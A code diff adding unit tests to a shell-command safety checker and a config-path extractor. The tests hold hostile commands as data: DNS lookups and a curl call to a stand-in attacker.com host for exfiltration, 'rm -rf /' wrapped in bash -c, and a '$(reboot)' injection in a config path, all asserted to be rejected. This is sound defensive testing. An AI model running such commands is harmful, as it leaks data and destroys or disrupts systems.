@@ -99,6 +99,20 @@ class TestIsSafeCommand:
         assert not _is_safe_command("pip install requests")
         assert not _is_safe_command("npm install axios")
 
+    def test_reject_dns_exfiltration(self) -> None:
+        assert not _is_safe_command("nslookup attacker.com")
+        assert not _is_safe_command("dig attacker.com")
+        assert not _is_safe_command("host attacker.com")
+        assert not _is_safe_command("ping -c 1 attacker.com")
+
+    def test_reject_bash_c_bypass(self) -> None:
+        # Wrapping blocked commands in bash -c must still be caught
+        assert not _is_safe_command("bash -c 'kubectl get pods'")
+        assert not _is_safe_command("sh -c 'curl http://attacker.com/leak'")
+        assert not _is_safe_command('bash -c "rm -rf /"')
+        # Safe commands inside bash -c should still be allowed
+        assert _is_safe_command("bash -c 'cat /etc/nginx/nginx.conf'")
+
 
 class TestExtractConfigPathsFromCmdline:
     """Tests for dynamic config path extraction from process output."""
@@ -155,6 +169,19 @@ class TestExtractConfigPathsFromCmdline:
         paths = _extract_config_paths_from_cmdline(ps_output)
         # .log is not a config extension
         assert paths == []
+
+    def test_rejects_shell_metacharacters(self) -> None:
+        """Paths with shell injection characters must not be extracted."""
+        ps_output = (
+            "USER       PID %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND\n"
+            "root         1  0.0  0.1  12345  6789 ?    Ss   10:00   0:01 "
+            "myapp --config '/app/config.yaml$(reboot)'\n"
+        )
+        paths = _extract_config_paths_from_cmdline(ps_output)
+        for p in paths:
+            assert "$" not in p
+            assert "`" not in p
+            assert "(" not in p
 
     def test_deduplicates_paths(self) -> None:
         ps_output = (
